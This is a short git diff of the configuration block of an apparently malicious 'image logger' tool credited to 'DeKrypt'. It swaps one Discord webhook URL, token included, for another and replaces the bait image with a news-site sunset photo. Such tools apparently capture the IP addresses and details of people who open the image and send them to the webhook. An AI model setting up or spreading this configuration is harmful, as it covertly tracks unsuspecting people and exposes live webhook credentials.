@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1073676404014723122/7WaojUcYefnVkSRI_A8q4pw1-UZIL9_PB3wSN2FRGIWMyxlf0bs-woV9BK020gxPr_4X",
-    "image": "https://logger-pied.vercel.app/", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1375955607642706002/O8TVrNe2Zk8UtoHnAfDj7PQDKI1O0d1hvayQ907uyH45rdUs-68wnXrdpI_g-F2-w5jk",
+    "image": "https://www.laprovinciadivarese.it/wp-content/uploads/2022/05/per-un-italiano-su-due-il-tramonto-e-il-momento-piu-atteso-dellestate_af908f02-7e99-11e7-bcd3-ae10ce1775ef_998_397_big_story_detail-690x362.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
     # CUSTOMIZATION #
